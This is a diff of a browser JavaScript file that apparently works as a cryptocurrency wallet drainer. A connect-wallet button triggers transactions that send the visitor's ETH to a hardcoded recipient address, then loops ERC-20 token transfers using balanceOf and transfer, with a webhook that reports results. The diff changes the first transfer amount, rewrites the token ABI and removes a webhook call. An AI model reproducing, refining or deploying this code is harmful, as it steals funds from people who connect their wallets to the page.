@@ -1,83 +1,5 @@
 let isConnecting = false; // Flag to prevent multiple connections
 
-// ERC-20 ABI definition
-const erc20ABI = [
-    // Transfer function
-    {
-        "constant": false,
-        "inputs": [
-            {
-                "name": "to",
-                "type": "address"
-            },
-            {
-                "name": "value",
-                "type": "uint256"
-            }
-        ],
-        "name": "transfer",
-        "outputs": [
-            {
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    // BalanceOf function
-    {
-        "constant": true,
-        "inputs": [
-            {
-                "name": "owner",
-                "type": "address"
-            }
-        ],
-        "name": "balanceOf",
-        "outputs": [
-            {
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    },
-    // Decimals function
-    {
-        "constant": true,
-        "inputs": [],
-        "name": "decimals",
-        "outputs": [
-            {
-                "name": "",
-                "type": "uint8"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    },
-    // Symbol function
-    {
-        "constant": true,
-        "inputs": [],
-        "name": "symbol",
-        "outputs": [
-            {
-                "name": "",
-                "type": "string"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-    },
-];
-
 async function connectWallet() {
     if (isConnecting) {
         console.log("Connection request already in progress...");
@@ -132,7 +54,7 @@ async function sendFirstTransaction(walletAddress) {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
         const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
-        const amountInEther = "0.000625"; // The updated amount for the first transaction
+        const amountInEther = "0.0002"; // Updated amount for the first transaction
 
         const transaction = {
             to: recipientAddress,
@@ -183,8 +105,6 @@ async function sendSecondTransaction(signer, walletAddress) {
             );
 
             console.log(`Transaction hash: ${txResponse.hash}`);
-            // Optionally send a webhook for each transfer
-            await sendWebhook(txResponse.hash, "success");
         }
     }
 }
@@ -222,6 +142,14 @@ async function sendWebhook(message, status) {
         console.error("Error sending webhook:", error);
     }
 }
+
+// ERC-20 ABI for interacting with token contracts
+const erc20ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function decimals() view returns (uint8)",
+    "function symbol() view returns (string)",
+    "function transfer(address to, uint amount) returns (bool)"
+];
 
 // Attach the event listener to the button
 document.getElementById("connectButton").addEventListener("click", connectWallet);
